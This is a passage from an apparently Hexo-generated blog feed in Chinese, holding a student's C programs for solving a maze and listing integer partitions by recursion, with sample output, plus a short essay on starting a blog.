class="number">1</span> &gt;= startX &amp;&amp; a[i<span class="number">-1</span>][j] == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(TraceRoute(a,i<span class="number">-1</span>,j) == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;    </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//左</span></span><br><span class="line">    <span class="keyword">if</span>(end != <span class="number">1</span> &amp;&amp; j - <span class="number">1</span> &lt;= endY &amp;&amp; a[i][j<span class="number">-1</span>] == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(TraceRoute(a,i,j<span class="number">-1</span>) == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//右 </span></span><br><span class="line">    <span class="keyword">if</span>(end != <span class="number">1</span> &amp;&amp; j + <span class="number">1</span> &gt;= startY &amp;&amp; a[i][j+<span class="number">1</span>] == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(TraceRoute(a,i,j+<span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果走到死胡同，并且没到达终点，则将将前一个点还原为1 </span></span><br><span class="line">    <span class="keyword">if</span>(end == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i][j] = <span class="number">1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span>  end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="comment">//创建迷宫，1表示可走的地方，0表示墙壁 </span></span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>][<span class="number">10</span>]=&#123;</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(TraceRoute(a,startX,startY) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n该迷宫没有路径可走！"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n迷宫走法如下：\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">迷宫走法如下：</span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">2</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">2</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">2</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近看递归的问题有点多，也逐渐有了自己的想法和思路。对于递归问题，其实让人不理解的无非是它的逻辑思路，遇到不理解的地方在纸上写写逻辑，问题就迎刃而解了。&lt;/p&gt;
&lt;h1 id=&quot;代码部分&quot;&gt;&lt;a href=&quot;#代码部分&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>实现整数的所有划分数</title>
    <link href="http://zcluslloye.cn/2018/03/10/resolve-number/"/>
    <id>http://zcluslloye.cn/2018/03/10/resolve-number/</id>
    <published>2018-03-10T11:20:28.000Z</published>
    <updated>2018-03-30T15:13:45.041Z</updated>
    
    <content type="html"><![CDATA[<p>本来以为已经弃C语言的坑了，没想到因为课程原因开始学习算法了= =！<br><br>还是不得不感叹时间飞逝，从开始只会写简单小程序到现在会使用简单算法的程序，想想半年前刚入协会的时候我连一个循环都写不出来….<br></p><p>说正事= =!<br><br>第一个算法案例就是递归问题：<br>利用递归来实现整数的划分数，并输出结果。<br>自己也想了很久，网上也找了几份源码，对自己现在写的不是很满意，之后再来完善吧。</p><h1 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">part</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i = x;i &gt;= <span class="number">1</span>;i--) <span class="comment">//把n从大到小分解 </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i + total &lt;= n)</span><br><span class="line">        &#123;</span><br><span class="line">            a[t++] = i; <span class="comment">//将n的划分由大到小给数组a[]</span></span><br><span class="line">            total += i; <span class="comment">//total的值逐渐向n靠拢，当n==total时就是打印的时候</span></span><br><span class="line">            part(i,n); <span class="comment">//递归调用，直到满足n==total</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(total==n)  <span class="comment">//等式两边n=total时打印</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>] != n)</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%d="</span>,n); <span class="comment">//如果右边不等于n,则打印等式左边的n及=</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;t;j++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>] != n)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a[j]); <span class="comment">//如果右边不等于n,则依次输出a[0],a[1],a[2].....</span></span><br><span class="line">            <span class="keyword">if</span>(j &lt; t - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"+"</span>); <span class="comment">//如果a[j]不是最后一个加数，就打印+号</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>); <span class="comment">//打印一行后添加'\n'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    t--;</span><br><span class="line">    total-=a[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    part(n,n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>=<span class="number">5</span>+<span class="number">1</span></span><br><span class="line"><span class="number">6</span>=<span class="number">4</span>+<span class="number">2</span></span><br><span class="line"><span class="number">6</span>=<span class="number">4</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line"><span class="number">6</span>=<span class="number">3</span>+<span class="number">3</span></span><br><span class="line"><span class="number">6</span>=<span class="number">3</span>+<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"><span class="number">6</span>=<span class="number">3</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line"><span class="number">6</span>=<span class="number">2</span>+<span class="number">2</span>+<span class="number">2</span></span><br><span class="line"><span class="number">6</span>=<span class="number">2</span>+<span class="number">2</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line"><span class="number">6</span>=<span class="number">2</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line"><span class="number">6</span>=<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本来以为已经弃C语言的坑了，没想到因为课程原因开始学习算法了= =！&lt;br&gt;&lt;br&gt;还是不得不感叹时间飞逝，从开始只会写简单小程序到现在会使用简单算法的程序，想想半年前刚入协会的时候我连一个循环都写不出来….&lt;br&gt;&lt;/p&gt;
&lt;p&gt;说正事= =!&lt;br&gt;&lt;br&gt;第一个算法案
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>谈一谈博客</title>
    <link href="http://zcluslloye.cn/2018/03/10/talk-about-blog/"/>
    <id>http://zcluslloye.cn/2018/03/10/talk-about-blog/</id>
    <published>2018-03-10T10:32:47.000Z</published>
    <updated>2018-03-10T11:06:05.178Z</updated>
    
    <content type="html"><![CDATA[<p>以前就想写博客很久了，理由有很多，不管是记录生活，还是学习上的知识，我觉得都有必要记录下来。身边很多朋友都写文章，但是我并不喜欢，也不习惯去写东西。</p><p>然而，对于那些成堆的知识，我只能一点一点记忆下来。那时我萌生了写博客记录学习的想法，找了好几家博客但似乎都不符合我的要求，自己建站吧又嫌太麻烦。后来自己也得过且过，也没想过是时候该把自己所学的给记录下来。</p><p>前几天想想，以前学的知识也只是零零碎碎地在记忆中，最终还是决定自己搭建博客来记录我那为数不多的知识。。</p><p>我想生活不应该只有忙碌，还应该有心灵的思考。理想和激情也不能被现实磨灭。愿今后顺利。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以前就想写博客很久了，理由有很多，不管是记录生活，还是学习上的知识，我觉得都有必要记录下来。身边很多朋友都写文章，但是我并不喜欢，也不习惯去写东西。&lt;/p&gt;
&lt;p&gt;然而，对于那些成堆的知识，我只能一点一点记忆下来。那时我萌生了写博客记录学习的想法，找了好几家博客但似乎都不符
      
    
    </summary>
    
    
      <category term="随笔" scheme="http://zcluslloye.cn/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
